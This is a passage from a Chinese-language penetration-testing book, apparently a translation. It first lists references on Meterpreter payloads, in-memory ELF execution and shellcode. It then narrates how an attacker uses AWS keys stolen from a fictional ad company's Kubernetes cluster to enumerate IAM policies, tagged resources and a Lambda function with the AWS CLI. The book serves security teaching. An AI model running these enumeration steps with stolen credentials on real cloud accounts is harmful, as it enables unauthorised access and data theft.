
在此阶段，我们在 Kubernetes 集群上已经拥有相当稳固的立足点。我们可以在随机节点上继续启动进程，以防有人销毁我们的 Kube 资源，但希望到那时我们已经完成了业务。

## 资源
- 有关 meterpreter 有效载荷的更多信息，请在 https://blog.rapid7.com/ 上搜索 OJ Reeves 的文章“Deep Dive into Stageless Meterpreter Payloads”。
- 有关 memcpy 和 mprotect 在 shellcode 执行中威力的深入文章，请参阅 Shivam Shrirao 的“Make Stack Executable Again”：http://bit.ly/3601dxh。
- @nsxz 的 ReflectiveELFLoader 提供了一个概念验证：https://github.com/nsxz/ReflectiveELFLoader/。代码记录良好，但需要一定的 ELF 头知识；请参阅 https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/。
- Linux 上仅内存执行的各种方法汇编可在 http://bit.ly/35YMiTY 找到。
- Memfd 于 Linux 内核 3.17 中引入。请参阅 memfd_create 手册页：http://bit.ly/3aeig27。
- 有关 DaemonSets 的更多信息，请参阅 Kubernetes 文档：http://bit.ly/2TBkmD8。
- 有关 Docker 的帮助，请参阅 API 文档：https://dockr.ly/2QKr1ck。

## 第四部分

## 内部敌人

> 重力不是真理的一种版本。它就是真理。任何怀疑它的人都被邀请从十楼窗户跳出去。
Richard Dawkins

## 10

## 内部敌人

![](img/961e81aef23040d0fbe348f58c055860_187_0.png)

在上一章中，我们接管了 MXR Ads 的交付集群。这带来了数百个密钥，从 AWS 访问密钥到 GitHub 令牌不等，承诺可以访问几乎所有涉及广告投放的数据库。我们尚未成为 AWS 账户的管理员，但也只差一步之遥。我们需要理清收集到的所有数据，并利用它找到提升权限的方法，甚至可能揭开 MXR Ads 与 Gretsch Politico 之间的隐藏联系。

## 通往神化的道路

我们加载从 Kube 检索到的 AWS 访问密钥，并查看随机用户的权限。例如，第 8 章中的 Kevin 就是一个不错的目标：

```
root@Point1:~/# aws iam get-user --profile kevin
"User": {
  "UserName": "kevin.duncan",
--snip--
```

我们知道，默认情况下，IAM 用户在 AWS 上完全没有任何权限。他们甚至无法更改自己的密码。因此，公司几乎总是会授予用户在处理用户和权限的 IAM 服务上仅足够的权限，以执行诸如更改密码、列出策略、启用多因素身份验证等基本操作。

为了限制这些权限的范围，管理员通常会添加条件，仅接受针对调用用户本身的 IAM API 调用。例如，Kevin 可能被允许列出他自己的权限，但不能列出附加到其他用户的权限：

```
root@Point1:~/# aws iam list-attached-user-policies \
--user-name=kevin.duncan \
--profile kevin

"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-self-manage",
"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-read-only",
"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-eks-admin"
```

的确，只要我们在 Kevin 以外的资源上调用 IAM 命令，就会立即收到错误，如下所示：

```
root@Point1:~/# aws iam get-policy \
--policy-arn mxrads-self-manage \
--profile kevin

An error occurred (AccessDenied) when calling the GetPolicy operation:
User: arn:aws:iam::886371554408:user/kevin.duncan is not authorized to
perform: iam:GetPolicy on resource: policy
arn:aws:iam::886371554408:policy/mxrads-eks-admin...
```

AWS 在访问权限方面管理得很严格。幸运的是，Kevin 策略的名称足够明确，我们可以猜测其内容：mxrads-eks-admin 表示 Kevin 是 EKS 的管理员，而 mxrads-read-only 可能赋予 Kevin 对 MXR Ads 使用的 165 个 AWS 服务子集的只读访问权限。只是需要尝试推断出具体是哪一些。最后一个策略 mxrads-self-manage 应该包含 Kevin 管理其账户的权限集合。

探索这些服务中的每一个可能需要数小时甚至数天的时间，尤其是对于如此投入 AWS 且业务架构复杂的公司。我们需要保持专注：我们正在寻找与 Gretsch Politico 相关的任何信息——具体来说是关于其客户或数据画像活动的资料。这可能以 S3 存储桶的形式出现，其中存放着数字广告评级（DAR）细分（用于衡量广告活动效果），也可能是一个 RDS 数据库表、运行在 EC2 上的 Web 服务器、API Gateway 上的代理服务、AWS Simple Queue Service（SQS）上的消息队列……在目前可用的十几个 AWS 区域中的任何一个。是的，我能感受到并分享你的沮丧。

幸运的是，AWS 有一个跨越给定区域多种资源类型和服务的实用 API：Resource Groups Tagging API。该 API 会返回 S3 存储桶、VPC 端点、数据库等，前提是对象具有标签。任何基础设施卫生状况最基本的公司都会确保为其资源打上标签，至少是为了计费目的，因此我们可以相当确信此 API 调用返回的结果是准确且全面的。我们首先列出 eu-west-1 区域的资源，如清单 10-1 所示。

```bash
root@Point1:~/# aws resourcegroupstaggingapi get-resources \
--region eu-west-1 \
--profile kevin > tagged_resources_euw1.txt

root@Point1:~/# head tagged_resources_euw1.txt

ResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,
Tags: [ "Key": "Name", "Value": "privateVPC"]
--snip--
arn:aws:ec2:eu-west-1:886371554408:security-group/sg-07108...
arn:aws:lambda:eu-west-1:886371554408:function:tag_index
arn:aws:events:eu-west-1:886371554408:rule/asg-controller3
arn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case
--snip--
```

*清单 10-1：列出 eu-west-1 的资源*

如果 Kevin 缺少列出资源标签（tag:GetResources）的必要权限，我们就只能手动开始探索最常用的 AWS 服务，例如 EC2、S3、Lambda、RDS、DynamoDB、API Gateway、ECR、KMS 和 Redshift。Redshift 是针对分析优化的托管 PostgreSQL，DynamoDB 是仿 MongoDB 的托管非关系型数据库，API Gateway 是将请求中继到您选择的后端的托管代理，而 Lambda 是一项在 AWS 自有实例上运行代码的服务（稍后会详细介绍）。这些基础服务甚至被 AWS 自身内部用于构建更复杂的产品，如 EKS，实际上 EKS 不过是 EC2、ECR、API Gateway、Lambda、DynamoDB 等服务的组合。

**注意** *有许多 AWS 审计和渗透测试工具可以枚举服务和资源。请查看 Toniiblyx 在 GitHub 上的汇编 https://github.com/toniblyx/my-arsenal-of-aws-security-tools/。请注意，大多数这些工具可能会向 AWS 发出大量 API 调用，这种活动即使在最少的监控下也能被发现（稍后会详细介绍）。*

从清单 10-1 中，我们从 MXR Ads 账户中提取了超过 8,000 个带标签的资源，因此自然而然地，我们转向我们信赖的 grep 命令来查找对 GP 的引用：

```
root@Point1:~# egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt

ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,
--snip--
```

太棒了！这就是我们隐藏的针。MXR Ads 有一个 Lambda 函数，似乎在与 Gretsch Politico 交换数据。AWS Lambda 是无服务器世界的黄金标准。你将 Python 源代码、Ruby 脚本或 Go 二进制文件打包到 ZIP 文件中，连同几个环境变量和 CPU/内存规格一起发送给 AWS Lambda，AWS 就会为你运行它。

该过程无需机器配置、systemd 设置和 SSH 的麻烦。你只需指向一个 ZIP 文件，它就会在你选择的时间执行。Lambda 函数甚至可以由其他 AWS 服务触发的外部事件触发，例如 S3 上的文件接收。Lambda 是一个功能强大的 crontab，它改变了人们编排工作负载的方式。

让我们更仔细地看看这个 dmp-sync Lambda 函数（见清单 10-2）。

```
root@Point1:~# aws lambda get-function \
--function-name dmp-sync-gretsch-politico \
--region eu-west-1 \
--profile kevin

--snip--
RepositoryType: S3,
Location: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-gp?versionId=YbSa...
```

清单 10-2：dmp-sync Lambda 函数的描述

我们在清单 10-2 中看到，Lambda 函数从 S3 路径 mxrads-lambdas/dmp-sync-gp 检索其需要执行的编译代码。我们立即冲向键盘并开始输入下一个命令：

```
root@Point1:~# aws s3api get-object \
--bucket mxrads-lambdas \
--key functions/dmp-sync-gp dmp-sync-gp \
--profile kevin

An error occurred (AccessDenied) when calling the GetObject operation:
Access Denied
```

但遗憾的是，Kevin 并未被信任到足以获得此存储桶的访问权限。我们可以用过去几天收到的所有“Access Denied”消息堆砌一堵墙。
